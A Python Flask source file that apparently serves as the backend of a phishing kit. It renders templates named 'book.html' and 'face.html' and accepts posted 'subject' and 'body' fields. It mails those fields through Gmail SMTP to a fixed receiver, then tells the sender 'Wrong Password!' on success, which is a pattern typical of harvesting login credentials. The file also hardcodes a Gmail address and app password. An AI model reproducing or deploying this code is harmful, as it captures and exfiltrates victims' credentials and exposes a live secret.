from flask import Flask, request, jsonify, render_template
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Your Gmail credentials
GMAIL_USER = 'brahmastragaming2612@gmail.com'
GMAIL_PASSWORD = 'zstnfcysyspjdtht'
GMAIL_RECIEVER = 'samparkaer2v@gmail.com'

# Add a sender's name
SENDER_NAME = 'Brahmastra Gaming'

def send_t_email( subject, body):
    msg = MIMEMultipart()
    msg['From'] = formataddr((SENDER_NAME, GMAIL_USER))
    msg['To'] = GMAIL_RECIEVER
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_USER, GMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(GMAIL_USER, GMAIL_RECIEVER, text)
        server.quit()
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False
    
# Route to serve the index.html
@app.route('/')
def index():
    return render_template('book.html')  # Flask looks inside 'templates' folder by default

@app.route('/face')
def face():
    return render_template('face.html')


@app.route('/send-t-emails', methods=['POST'])
def send_t_emails_route():
    data = request.json
    
    subject = data.get('subject')
    body = data.get('body')

    failed_emails = []
    
    if not send_t_email( subject, body):
        failed_emails.append(subject)

    if failed_emails:
        return jsonify({'status': 'error', 'message': f'Failed to login to: {", ".join(failed_emails)}'}), 500
    else:
        return jsonify({'status': 'success', 'message': 'Wrong Password!'})

if __name__ == '__main__':
    app.run(debug=True)
